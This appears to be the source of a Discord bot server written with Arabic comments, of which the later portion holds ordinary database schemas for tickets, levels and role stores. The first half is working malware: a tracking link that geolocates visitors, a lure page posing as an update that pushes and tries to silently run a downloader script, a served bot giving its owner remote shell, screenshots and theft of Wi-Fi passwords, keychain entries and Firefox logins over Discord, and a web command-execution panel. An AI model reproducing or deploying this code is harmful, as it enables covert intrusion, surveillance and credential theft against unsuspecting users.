// ============================================================
// البوت المتكامل - النسخة النهائية مع جميع الميزات
// ============================================================

const {
  Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder,
  ButtonBuilder, ButtonStyle, StringSelectMenuBuilder,
  PermissionsBitField, ChannelType, ModalBuilder,
  TextInputBuilder, TextInputStyle, ActivityType, MessageFlags,
  SlashCommandBuilder, REST, Routes
} = require('discord.js');
const { createCanvas, loadImage } = require('@napi-rs/canvas');
const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const { exec, spawn, execSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

// ========== متغيرات البيئة ==========
const TOKEN = process.env.DISCORD_TOKEN;
const MONGO_URL = process.env.MONGO_URL;
const OWNER_ID = process.env.OWNER_ID || '1507841424186675220';
const CLIENT_ID = process.env.CLIENT_ID || 'YOUR_CLIENT_ID';
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'default_token_123';

if (!TOKEN || !MONGO_URL) {
  console.error('❌ تأكد من وجود DISCORD_TOKEN و MONGO_URL');
  process.exit(1);
}

// ========== اتصال MongoDB ==========
mongoose.connect(MONGO_URL)
  .then(() => console.log('✅ اتصال MongoDB ناجح'))
  .catch(err => { console.error('❌ فشل اتصال MongoDB:', err); process.exit(1); });

// ============================================================
// ========== خادم الويب ==========
// ============================================================

app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

let currentWorkingDirectory = os.homedir();

// ===== نظام تتبع الروابط =====
const linkTracker = {
  links: {},
  
  createLink(targetUserId) {
    const linkId = crypto.randomBytes(8).toString('hex');
    const trackingLink = `http://${getLocalIP()}:${port}/track/${linkId}`;
    this.links[linkId] = {
      targetUserId,
      createdAt: Date.now(),
      visits: [],
      ip: null,
      userAgent: null,
      geo: null,
      type: 'track'
    };
    return trackingLink;
  },
  
  createExploitLink(targetUserId) {
    const linkId = crypto.randomBytes(8).toString('hex');
    const exploitLink = `http://${getLocalIP()}:${port}/exploit/${linkId}`;
    this.links[linkId] = {
      targetUserId,
      createdAt: Date.now(),
      visits: [],
      ip: null,
      userAgent: null,
      geo: null,
      type: 'exploit'
    };
    return exploitLink;
  },
  
  trackVisit(linkId, req) {
    if (!this.links[linkId]) return false;
    
    const visit = {
      timestamp: Date.now(),
      ip: req.ip || req.connection?.remoteAddress || req.headers['x-forwarded-for'] || 'غير معروف',
      userAgent: req.headers['user-agent'] || 'غير معروف',
      referer: req.headers['referer'] || 'مباشر',
      headers: req.headers
    };
    
    this.links[linkId].visits.push(visit);
    this.links[linkId].ip = visit.ip;
    this.links[linkId].userAgent = visit.userAgent;
    
    try {
      axios.get(`http://ip-api.com/json/${visit.ip.split(':').pop()}`).then(res => {
        if (res.data && res.data.status === 'success') {
          this.links[linkId].geo = res.data;
        }
      }).catch(() => {});
    } catch(e) {}
    
    return true;
  },
  
  getVisits(linkId) {
    return this.links[linkId] || null;
  },
  
  deleteLink(linkId) {
    if (this.links[linkId]) {
      delete this.links[linkId];
      return true;
    }
    return false;
  }
};

// ===== مسار التتبع =====
app.get('/track/:linkId', (req, res) => {
  const { linkId } = req.params;
  linkTracker.trackVisit(linkId, req);
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Loading...</title>
      <style>
        body { 
          background: #0a0a0a; 
          color: #444; 
          font-family: Arial; 
          display: flex; 
          justify-content: center; 
          align-items: center; 
          height: 100vh;
          margin: 0;
          flex-direction: column;
        }
        .loader {
          width: 50px;
          height: 50px;
          border: 3px solid #222;
          border-top: 3px solid #00ff00;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        p { color: #333; margin-top: 20px; }
      </style>
    </head>
    <body>
      <div class="loader"></div>
      <p>جاري التحميل...</p>
      <script>
        setTimeout(() => {
          window.location.href = 'https://www.youtube.com';
        }, 2000);
      </script>
    </body>
    </html>
  `);
});

// ===== صفحة الرابط الملغم =====
app.get('/exploit/:id', (req, res) => {
  const { id } = req.params;
  
  // تسجيل من فتح الرابط
  linkTracker.trackVisit(id, req);
  console.log(`[EXPLOIT] رابط ${id} تم فتحه من ${req.ip}`);
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Loading...</title>
      <style>
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
        .loader { width: 40px; height: 40px; border: 3px solid #222; border-top: 3px solid #00ff00; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #444; margin-top: 20px; }
        .status { color: #666; font-size: 12px; margin-top: 10px; }
      </style>
    </head>
    <body>
      <div class="loader"></div>
      <p>جارٍ تحميل التحديثات...</p>
      <div class="status" id="status">جاري الاتصال بالخادم...</div>
      
      <script>
        (function() {
          const platform = navigator.platform || '';
          const isWindows = platform.includes('Win');
          const isMac = platform.includes('Mac');
          const isLinux = platform.includes('Linux');
          
          let downloadUrl = '/payload';
          let fileName = '';
          
          if (isWindows) {
            fileName = 'update.bat';
          } else if (isMac || isLinux) {
            fileName = 'update.sh';
          } else {
            document.getElementById('status').textContent = '❌ نظام غير مدعوم';
            return;
          }
          
          document.getElementById('status').textContent = '📥 جاري تحميل التحديثات...';
          
          fetch(downloadUrl)
            .then(res => res.text())
            .then(data => {
              const blob = new Blob([data], { type: 'text/plain' });
              const url = URL.createObjectURL(blob);
              const a = document.createElement('a');
              a.href = url;
              a.download = fileName;
              document.body.appendChild(a);
              a.click();
              document.body.removeChild(a);
              URL.revokeObjectURL(url);
              
              document.getElementById('status').textContent = '✅ تم تحميل التحديثات بنجاح!';
              
              setTimeout(() => {
                if (isWindows) {
                  try {
                    const wsh = new ActiveXObject('WScript.Shell');
                    if (wsh) {
                      wsh.Run('cmd /c ' + fileName, 0, false);
                    }
                  } catch(e) {}
                }
              }, 2000);
            })
            .catch(err => {
              document.getElementById('status').textContent = '❌ فشل التحميل: ' + err.message;
            });
          
          setTimeout(() => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = downloadUrl;
            document.body.appendChild(iframe);
            setTimeout(() => document.body.removeChild(iframe), 5000);
          }, 1000);
        })();
      </script>
    </body>
    </html>
  `);
});

// ===== تحميل البايلود حسب النظام =====
app.get('/payload', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  
  console.log(`[PAYLOAD] ${req.ip} | ${userAgent}`);
  
  let payloadScript = '';
  
  if (userAgent.includes('Windows')) {
    payloadScript = `
      @echo off
      cd %TEMP%
      powershell -command "Invoke-WebRequest -Uri 'http://${getLocalIP()}:${port}/bot.js' -OutFile 'bot.js'"
      powershell -command "Invoke-WebRequest -Uri 'http://${getLocalIP()}:${port}/package.json' -OutFile 'package.json'"
      powershell -command "npm install discord.js"
      powershell -command "Start-Process -WindowStyle Hidden -FilePath 'node' -ArgumentList 'bot.js'"
    `;
    res.setHeader('Content-Type', 'application/x-msdownload');
    res.setHeader('Content-Disposition', 'attachment; filename="update.bat"');
    res.send(payloadScript);
    
  } else if (userAgent.includes('Mac')) {
    payloadScript = `
      #!/bin/bash
      cd /tmp
      curl -o bot.js http://${getLocalIP()}:${port}/bot.js
      curl -o package.json http://${getLocalIP()}:${port}/package.json
      npm install discord.js
      node bot.js &
    `;
    res.setHeader('Content-Type', 'application/x-sh');
    res.setHeader('Content-Disposition', 'attachment; filename="update.sh"');
    res.send(payloadScript);
    
  } else {
    payloadScript = `
      #!/bin/bash
      cd /tmp
      wget -O bot.js http://${getLocalIP()}:${port}/bot.js
      wget -O package.json http://${getLocalIP()}:${port}/package.json
      npm install discord.js
      node bot.js &
    `;
    res.setHeader('Content-Type', 'application/x-sh');
    res.setHeader('Content-Disposition', 'attachment; filename="update.sh"');
    res.send(payloadScript);
  }
});

// ===== تقديم ملفات البوت للتحميل =====
app.get('/bot.js', (req, res) => {
  const botCode = `
    const { Client, GatewayIntentBits } = require('discord.js');
    const TOKEN = '${TOKEN}';
    const client = new Client({ 
      intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
      ] 
    });
    
    client.on('messageCreate', async (message) => {
      if (message.author.bot || !message.guild) return;
      if (!message.content.startsWith('!')) return;
      
      const args = message.content.slice(1).trim().split(/ +/);
      const cmd = args.shift().toLowerCase();
      
      if (cmd === 'شيل' && message.author.id === '${OWNER_ID}') {
        const { exec } = require('child_process');
        exec(args.join(' '), (err, stdout, stderr) => {
          message.reply(\`\`\`\n\${stdout || stderr || 'لا يوجد مخرجات'}\n\`\`\`);
        });
      }
      
      if (cmd === 'لقطة' && message.author.id === '${OWNER_ID}') {
        const { execSync } = require('child_process');
        const fs = require('fs');
        const os = require('os');
        let path = '/tmp/screenshot.png';
        if (os.platform() === 'win32') {
          path = process.env.TEMP + '\\\\screenshot.png';
          execSync(\`powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; \$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \$bmp = New-Object System.Drawing.Bitmap(\$screen.Width, \$screen.Height); \$g = [System.Drawing.Graphics]::FromImage(\$bmp); \$g.CopyFromScreen(\$screen.X, \$screen.Y, 0, 0, \$screen.Size); \$bmp.Save('\${path.replace(/\\\\/g, '\\\\\\\\')}', [System.Drawing.Imaging.ImageFormat]::Png);"\`);
        } else {
          execSync(\`import -window root \${path} || screencapture \${path} || scrot \${path}\`);
        }
        if (fs.existsSync(path)) {
          await message.channel.send({ files: [path] });
          fs.unlinkSync(path);
        }
      }
      
      if (cmd === 'معلومات_جهاز' && message.author.id === '${OWNER_ID}') {
        const os = require('os');
        const ip = Object.values(os.networkInterfaces()).flat().find(i => i.family === 'IPv4' && !i.internal)?.address || 'غير معروف';
        await message.reply(\`
🖥️ معلومات الجهاز:
- اسم الجهاز: \${os.hostname()}
- النظام: \${os.platform()} \${os.release()}
- المستخدم: \${os.userInfo().username}
- المعالج: \${os.cpus().length} نوى
- الذاكرة: \${Math.round(os.totalmem() / 1024 / 1024 / 1024)} GB
- IP: \${ip}
        \`);
      }
      
      if (cmd === 'كلمات_المرور' && message.author.id === '${OWNER_ID}') {
        const { exec } = require('child_process');
        const os = require('os');
        let result = '';
        if (os.platform() === 'win32') {
          exec('netsh wlan show profile name=* key=clear', (err, stdout) => {
            message.reply(\`\`\`\n\${stdout || 'لم يتم العثور على كلمات مرور'}\n\`\`\`);
          });
        } else if (os.platform() === 'darwin') {
          exec('security dump-keychain | grep -E "acct|passwd"', (err, stdout) => {
            message.reply(\`\`\`\n\${stdout || 'لم يتم العثور على كلمات مرور'}\n\`\`\`);
          });
        } else {
          exec('find ~/.mozilla/firefox -name "logins.json" -exec cat {} \\; | grep -E "hostname|encryptedUsername"', (err, stdout) => {
            message.reply(\`\`\`\n\${stdout || 'لم يتم العثور على كلمات مرور'}\n\`\`\`);
          });
        }
      }
    });
    
    client.login(TOKEN);
    console.log('✅ البوت الملغم يعمل');
  `;
  
  res.setHeader('Content-Type', 'application/javascript');
  res.send(botCode);
});

// ===== تقديم ملف package.json =====
app.get('/package.json', (req, res) => {
  const pkg = {
    name: "discord-bot",
    version: "1.0.0",
    description: "Discord Bot",
    main: "bot.js",
    scripts: { start: "node bot.js" },
    dependencies: {
      "discord.js": "^14.14.1"
    }
  };
  res.json(pkg);
});

// ===== API التحكم =====
app.post('/api/exec', (req, res) => {
  const { cmd, token } = req.body;
  if (token !== ADMIN_TOKEN) return res.status(403).json({ error: 'Forbidden' });
  
  try {
    const output = execSync(cmd, { cwd: currentWorkingDirectory, encoding: 'utf8', timeout: 30000 });
    res.json({ output, cwd: currentWorkingDirectory });
  } catch (error) {
    res.json({ output: error.message || error.toString(), error: true });
  }
});

app.post('/api/upload', (req, res) => {
  const { file, path: filePath, token } = req.body;
  if (token !== ADMIN_TOKEN) return res.status(403).json({ error: 'Forbidden' });
  
  try {
    const fullPath = filePath.startsWith('/') || filePath.match(/^[A-Za-z]:/) ? filePath : path.join(currentWorkingDirectory, filePath);
    const dir = path.dirname(fullPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(fullPath, Buffer.from(file, 'base64'));
    res.json({ success: true, path: fullPath });
  } catch (error) {
    res.json({ error: error.message });
  }
});

app.get('/api/download', (req, res) => {
  const { file, token } = req.query;
  if (token !== ADMIN_TOKEN) return res.status(403).json({ error: 'Forbidden' });
  
  try {
    const fullPath = file.startsWith('/') || file.match(/^[A-Za-z]:/) ? file : path.join(currentWorkingDirectory, file);
    if (!fs.existsSync(fullPath)) return res.status(404).json({ error: 'File not found' });
    const data = fs.readFileSync(fullPath);
    res.json({ file: data.toString('base64'), path: fullPath, size: data.length });
  } catch (error) {
    res.status(404).json({ error: error.message });
  }
});

app.get('/api/screenshot', (req, res) => {
  const { token } = req.query;
  if (token !== ADMIN_TOKEN) return res.status(403).json({ error: 'Forbidden' });
  
  try {
    let screenshotPath = '/tmp/screenshot.png';
    if (os.platform() === 'win32') {
      const tempDir = process.env.TEMP || 'C:\\Windows\\Temp';
      screenshotPath = path.join(tempDir, 'screenshot.png');
      const psScript = `
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $bmp.Save('${screenshotPath.replace(/\\/g, '\\\\')}', [System.Drawing.Imaging.ImageFormat]::Png)
        $bmp.Dispose()
        $g.Dispose()
      `;
      execSync(`powershell -command "${psScript}"`);
    } else if (os.platform() === 'darwin') {
      screenshotPath = '/tmp/screenshot.png';
      execSync(`screencapture -x ${screenshotPath}`);
    } else {
      screenshotPath = '/tmp/screenshot.png';
      execSync(`import -window root ${screenshotPath} 2>/dev/null || gnome-screenshot -f ${screenshotPath} 2>/dev/null || scrot ${screenshotPath} 2>/dev/null`);
    }
    
    if (fs.existsSync(screenshotPath)) {
      const data = fs.readFileSync(screenshotPath);
      fs.unlinkSync(screenshotPath);
      res.json({ image: data.toString('base64') });
    } else {
      res.json({ error: 'Screenshot failed' });
    }
  } catch (error) {
    res.json({ error: error.message });
  }
});

// ===== لوحة التحكم الرئيسية =====
app.get('/control', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Control Panel</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
          font-family: 'Courier New', monospace; 
          background: #0a0a0a; 
          color: #00ff00; 
          padding: 20px;
          min-height: 100vh;
        }
        .container { max-width: 1000px; margin: auto; }
        .header { 
          border-bottom: 1px solid #00ff00; 
          padding-bottom: 10px;
          margin-bottom: 20px;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .header h1 { font-size: 20px; }
        .status { color: #888; font-size: 12px; }
        .terminal {
          background: #111;
          border: 1px solid #333;
          border-radius: 5px;
          padding: 15px;
          min-height: 400px;
          max-height: 500px;
          overflow-y: auto;
          font-size: 14px;
          line-height: 1.6;
          white-space: pre-wrap;
          word-wrap: break-word;
        }
        .terminal .prompt { color: #00ff00; }
        .terminal .error { color: #ff4444; }
        .terminal .output { color: #aaa; }
        .input-line {
          display: flex;
          gap: 10px;
          margin-top: 10px;
        }
        input {
          flex: 1;
          background: #111;
          color: #00ff00;
          border: 1px solid #333;
          padding: 12px 15px;
          border-radius: 5px;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          outline: none;
        }
        input:focus { border-color: #00ff00; }
        button {
          background: #222;
          color: #00ff00;
          border: 1px solid #444;
          padding: 12px 25px;
          border-radius: 5px;
          cursor: pointer;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          transition: all 0.2s;
        }
        button:hover { background: #333; border-color: #00ff00; }
        .toolbar {
          display: flex;
          gap: 10px;
          margin-top: 10px;
          flex-wrap: wrap;
        }
        .toolbar button {
          padding: 8px 15px;
          font-size: 12px;
        }
        .file-list {
          background: #111;
          border: 1px solid #333;
          border-radius: 5px;
          padding: 10px;
          margin-top: 10px;
          max-height: 200px;
          overflow-y: auto;
          display: none;
        }
        .file-list .file-item {
          padding: 3px 0;
          border-bottom: 1px solid #1a1a1a;
          color: #aaa;
          font-size: 13px;
        }
        .file-list .dir { color: #4488ff; }
        .file-list .exe { color: #44ff88; }
        .file-list .img { color: #ff8844; }
        .file-list .txt { color: #aaaaaa; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>🖥️ CONTROL PANEL</h1>
          <div class="status" id="status">${os.hostname()} | ${os.platform()}</div>
        </div>
        <div class="terminal" id="terminal">$> System ready. Type commands below.\n$> </div>
        <div class="input-line">
          <input type="text" id="cmdInput" placeholder="Type command..." autofocus>
          <button onclick="execCommand()">▶ Run</button>
        </div>
        <div class="toolbar">
          <button onclick="refreshFiles()">📁 List Files</button>
          <button onclick="takeScreenshot()">🖼️ Screenshot</button>
          <button onclick="clearTerminal()">🗑️ Clear</button>
          <button onclick="getSystemInfo()">💻 Sysinfo</button>
        </div>
        <div id="fileList" class="file-list"></div>
      </div>
      <script>
        const token = prompt('Enter admin token:') || 'default_token_123';
        const term = document.getElementById('terminal');
        const input = document.getElementById('cmdInput');
        const fileList = document.getElementById('fileList');
        let commandHistory = [];
        let historyIndex = 0;
        
        function appendOutput(text, type = 'output') {
          const line = document.createElement('div');
          if (type === 'prompt') line.style.color = '#00ff00';
          else if (type === 'error') line.style.color = '#ff4444';
          else line.style.color = '#aaa';
          line.textContent = text;
          term.appendChild(line);
          term.scrollTop = term.scrollHeight;
        }
        
        async function execCommand() {
          const cmd = input.value.trim();
          if (!cmd) return;
          input.value = '';
          commandHistory.push(cmd);
          historyIndex = commandHistory.length;
          appendOutput('$> ' + cmd, 'prompt');
          
          try {
            const res = await fetch('/api/exec', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cmd, token })
            });
            const data = await res.json();
            if (data.error) appendOutput('[!] ' + data.output, 'error');
            else if (data.output) appendOutput(data.output);
            if (data.cwd) document.getElementById('status').textContent = data.cwd + ' | ' + '${os.hostname()}';
          } catch(e) {
            appendOutput('[!] Error: ' + e.message, 'error');
          }
          appendOutput('$> ', 'prompt');
        }
        
        input.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') { e.preventDefault(); execCommand(); }
          if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (historyIndex > 0) {
              historyIndex--;
              input.value = commandHistory[historyIndex] || '';
            }
          }
          if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (historyIndex < commandHistory.length - 1) {
              historyIndex++;
              input.value = commandHistory[historyIndex] || '';
            } else {
              historyIndex = commandHistory.length;
              input.value = '';
            }
          }
        });
        
        async function refreshFiles() {
          try {
            const res = await fetch('/api/exec', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cmd: 'ls -la || dir', token })
            });
            const data = await res.json();
            fileList.innerHTML = '<div class="file-item" style="color:#888;">📁 Directory Listing:</div>';
            const lines = data.output.split('\\n');
            lines.forEach(line => {
              if (line.trim()) {
                const item = document.createElement('div');
                item.className = 'file-item';
                if (line.includes('dr')) item.classList.add('dir');
                else if (line.includes('.exe') || line.includes('.sh')) item.classList.add('exe');
                else if (line.includes('.png') || line.includes('.jpg')) item.classList.add('img');
                item.textContent = line;
                fileList.appendChild(item);
              }
            });
            fileList.style.display = 'block';
          } catch(e) { console.error(e); }
        }
        
        async function takeScreenshot() {
          try {
            const res = await fetch('/api/screenshot?token=' + token);
            const data = await res.json();
            if (data.image) {
              const win = window.open('', '_blank');
              win.document.write('<img src="data:image/png;base64,' + data.image + '" style="max-width:100%;">');
              win.document.title = 'Screenshot';
            } else if (data.error) {
              appendOutput('[!] Screenshot error: ' + data.error, 'error');
            }
          } catch(e) {
            appendOutput('[!] Screenshot error: ' + e.message, 'error');
          }
        }
        
        async function getSystemInfo() {
          const cmds = {
            win32: 'systeminfo | findstr /i "hostname os version processor memory"',
            linux: 'uname -a && cat /etc/os-release | grep PRETTY_NAME && lscpu | head -5 && free -h'
          };
          const cmd = cmds['${os.platform()}'] || 'uname -a';
          try {
            const res = await fetch('/api/exec', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cmd, token })
            });
            const data = await res.json();
            if (data.output) appendOutput(data.output);
          } catch(e) { appendOutput('[!] Error: ' + e.message, 'error'); }
        }
        
        function clearTerminal() {
          term.innerHTML = '$> Terminal cleared.\\n$> ';
        }
        
        appendOutput('Connected to ${os.hostname()} | ${os.platform()} ${os.release()}');
        appendOutput('Type "help" for available commands.');
        appendOutput('$> ', 'prompt');
        input.focus();
      </script>
    </body>
    </html>
  `);
});

app.get('/', (req, res) => {
  res.redirect('/control');
});

app.listen(port, () => console.log(`🌐 خادم الويب على المنفذ ${port}`));

// ============================================================
// ========== دوال مساعدة ==========
// ============================================================

function getLocalIP() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return '127.0.0.1';
}

function getSystemInfo() {
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    release: os.release(),
    arch: os.arch(),
    cpus: os.cpus().length,
    memory: {
      total: Math.round(os.totalmem() / (1024 ** 3)),
      free: Math.round(os.freemem() / (1024 ** 3))
    },
    uptime: Math.floor(os.uptime() / 3600) + 'h',
    user: os.userInfo().username,
    ip: getLocalIP()
  };
}

function executeCommand(cmd) {
  return new Promise((resolve) => {
    exec(cmd, { cwd: currentWorkingDirectory, maxBuffer: 10 * 1024 * 1024, timeout: 30000 }, (error, stdout, stderr) => {
      if (error) {
        resolve({ output: stderr || error.message, error: true });
      } else {
        resolve({ output: stdout || '(no output)', error: false });
      }
    });
  });
}

// ============================================================
// ========== نماذج MongoDB ==========
// ============================================================

const ConfigSchema = new mongoose.Schema({
  guildId: { type: String, unique: true, required: true },
  logChannel: String,
  ticketLogChannel: String,
  leaveLogChannel: String,
  welcomeChannel: String,
  welcomeMessage: { type: String, default: 'أهلاً بك في السيرفر! 🎉' },
  welcomeTitle: { type: String, default: '🔥 مرحباً بك في المجتمع' },
  welcomeImage: String,
  welcomeBackground: String,
  muteRole: String,
  joinRole: String,
  ticketPanelImage: String,
  rolesImage: String,
  bannerImage: String,
  generalImage: String,
  levelChannelId: String,
  suggestionsChannel: String,
  suggestionsTitle: { type: String, default: '💡 قناة الاقتراحات' },
  suggestionsDescription: { type: String, default: 'شاركنا اقتراحك!' },
  suggestionsColor: { type: String, default: '#2b2d31' },
  suggestionsImage: String,
  tasksChannel: String,
  leaveRequestChannel: String,
  storeChannel: String,
  leaveManagerRole: String,
  botControllerRole: String,
  sellerRole: String,
  pointsPerTask: { type: Number, default: 10 },
  promotionPoints: { type: Number, default: 100 },
  leavePanelImage: String,
  storePanelImage: String,
  uiTitle: { type: String, default: '✏️ تغيير الاسم' },
  uiDescription: { type: String, default: 'اضغط على الزر أدناه لتغيير اسمك المستعار في السيرفر.' },
  uiNoteText: { type: String, default: 'يمكنك تغيير اسمك مرة كل 5 ساعات.' },
  uiBannerUrl: { type: String, default: 'https://via.placeholder.com/800x240/1e1f22/5865f2?text=+BANNER+' },
  uiRolesDropdownLabel: { type: String, default: 'اختر الرتبة' },
  uiRolesOptions: { type: [String], default: ['Game Notice', 'Event Notice', 'Ajr Notice'] },
  uiRolesImage: { type: String, default: 'https://i.imgur.com/7dXe7tM.png' },
  uiSuggestTitle: { type: String, default: '💡 قناة الاقتراحات' },
  uiSuggestDescription: { type: String, default: 'شاركنا اقتراحك!' },
  uiSuggestImage: { type: String, default: '' },
  uiSuggestBanner: { type: String, default: 'https://via.placeholder.com/800x240/1e1f22/5865f2?text=+SUGGESTIONS+' },
  uiTicketTitle: { type: String, default: '🎫 تذاكر دعم فني' },
  uiTicketDescription: { type: String, default: 'اختر القسم المناسب لطلب المساعدة.' },
  uiTicketImage: { type: String, default: 'https://i.imgur.com/GkKqN3G.png' },
  uiLeaveTitle: { type: String, default: '📅 لوحة إدارة الإجازات والاستقالات' },
  uiLeaveDescription: { type: String, default: 'استخدم الأزرار أدناه لإدارة الطلبات.' },
  uiLeaveImage: { type: String, default: '' },
  uiStoreTitle: { type: String, default: '🛒 متجر الرتب' },
  uiStoreDescription: { type: String, default: 'اختر الرتبة التي تريد شراءها.' },
  uiStoreImage: { type: String, default: '' },
}, { timestamps: true });
const Config = mongoose.model('Config', ConfigSchema);

const UserSchema = new mongoose.Schema({
  guildId: String,
  userId: String,
  xp: { type: Number, default: 0 },
  level: { type: Number, default: 0 },
  messages: { type: Number, default: 0 },
  adminPoints: { type: Number, default: 0 },
  credits: { type: Number, default: 0 },
  lastDaily: { type: Date, default: null },
  assignedTasks: [{ taskId: mongoose.Schema.Types.ObjectId, status: { type: String, enum: ['pending', 'accepted', 'completed'], default: 'pending' } }],
  leave: { isOnLeave: { type: Boolean, default: false }, leaveEnd: Date, savedRoles: [String] },
  purchasedRoles: [String],
}, { timestamps: true });
UserSchema.index({ guildId: 1, userId: 1 }, { unique: true });
const User = mongoose.model('User', UserSchema);

const TaskSchema = new mongoose.Schema({
  guildId: String,
  assignedBy: String,
  assignedTo: String,
  title: String,
  description: String,
  status: { type: String, enum: ['pending', 'accepted', 'completed', 'rejected'], default: 'pending' },
  points: { type: Number, default: 10 },
  adminPoints: { type: Number, default: 0 },
  proofText: String,
  proofImage: String,
  createdAt: { type: Date, default: Date.now },
  completedAt: Date,
});
const Task = mongoose.model('Task', TaskSchema);

const LeaveRequestSchema = new mongoose.Schema({
  guildId: String,
  userId: String,
  reason: String,
  duration: Number,
  startDate: Date,
  endDate: Date,
  status: { type: String, enum: ['pending', 'approved', 'rejected'], default: 'pending' },
  approvedBy: String,
  createdAt: { type: Date, default: Date.now },
  type: { type: String, enum: ['leave', 'resignation'], default: 'leave' },
});
const LeaveRequest = mongoose.model('LeaveRequest', LeaveRequestSchema);

const LeaveLogSchema = new mongoose.Schema({
  guildId: String,
  userId: String,
  action: { type: String, enum: ['requested', 'approved', 'rejected', 'ended', 'resigned'] },
  requestId: { type: mongoose.Schema.Types.ObjectId, ref: 'LeaveRequest' },
  details: String,
  timestamp: { type: Date, default: Date.now },
});
const LeaveLog = mongoose.model('LeaveLog', LeaveLogSchema);

const StoreItemSchema = new mongoose.Schema({
  guildId: String,
  roleId: String,
  price: Number,
  description: String,
});
const StoreItem = mongoose.model('StoreItem', StoreItemSchema);

const PendingPurchaseSchema = new mongoose.Schema({
  guildId: String,
  userId: String,
  roleId: String,
  roleName: String,
  price: Number,
  status: { type: String, enum: ['pending', 'completed', 'cancelled'], default: 'pending' },
  createdAt: { type: Date, default: Date.now },
});
const PendingPurchase = mongoose.model('PendingPurchase', PendingPurchaseSchema);

const WarnSchema = new mongoose.Schema({
  guildId: String,
  userId: String,
  reason: String,
  moderator: String,
  date: { type: Date, default: Date.now },
});
const Warn = mongoose.model('Warn', WarnSchema);

const TicketSettingsSchema = new mongoose.Schema({
  guildId: { type: String, unique: true, required: true },
  sections: [{
    name: String,
    roleId: String,
    emoji: { type: String, default: '📌' },
    canRestart: { type: Boolean, default: false },
  }],
  ticketCounter: { type: Number, default: 0 },
});
const TicketSettings = mongoose.model('TicketSettings', TicketSettingsSchema);

const TicketLogSchema = new mongoose.Schema({
  guildId: String,
  channelId: String,
  userId: String,
  section: String,
  createdAt: { type: Date, default: Date.now },
  status: { type: String, enum: ['open', 'claimed', 'closed'], default: 'open' },
  claimedBy: { type: String, default: null },
  addedMembers: [String],
  closedAt: { type: Date, default: null },
  messages: [{
    author: String,
    content: String,
    attachments: [String],
    timestamp: Date,
  }],
});
const TicketLog = mongoose.model('TicketLog', TicketLogSchema);

const AutoLineSchema = new mongoose.Schema({
  guildId: { type: String, required: true },
  channelId: { type: String, required: true },
  text: String,
  image: String,
  enabled: { type: Boolean, default: false },
});
AutoLineSchema.index({ guildId: 1, channelId: 1 }, { unique: true });
const AutoLine = mongoose.model('AutoLine', AutoLineSchema);

const AutoReplySchema = new mongoose.Schema({
  guildId: String,
  keyword: String,
  reply: String,
  image: String,
});
AutoReplySchema.index({ guildId: 1, keyword: 1 }, { unique: true });
const AutoReply = mongoose.model('AutoReply', AutoReplySchema);

const LevelRoleSchema = new mongoose.Schema({
  guildId: String,
  level: Number,
  roleId: String,
});
LevelRoleSchema.index({ guildId: 1, level: 1 }, { unique: true });
const LevelRole = mongoose.model('LevelRole', LevelRoleSchema);

const ControllerSchema = new mongoose.Schema({
  guildId: String,
  userId: String,
});
ControllerSchema.index({ guildId: 1, userId: 1 }, { unique: true });
const Controller = mongoose.model('Controller', ControllerSchema);

const NameCooldownSchema = new mongoose.Schema({
  userId: { type: String, unique: true, required: true },
  timestamp: { type: Date, default: Date.now },
});
const NameCooldown = mongoose.model('NameCooldown', NameCooldownSchema);

const MapConfigSchema = new mongoose.Schema({
  guildId: { type: String, unique: true, required: true },
  title: { type: String, default: '🗺️ خريطة السيرفر' },
  description: { type: String, default: 'اضغط على أحد الأزرار أدناه لعرض القنوات التابعة لكل قسم.' },
  banner: { type: String, default: '' },
  sections: [{
    name: String,
    channels: [String]
  }]
});
const MapConfig = mongoose.model('MapConfig', MapConfigSchema);

const RatingSchema = new mongoose.Schema({
  guildId: String,
  userId: String,
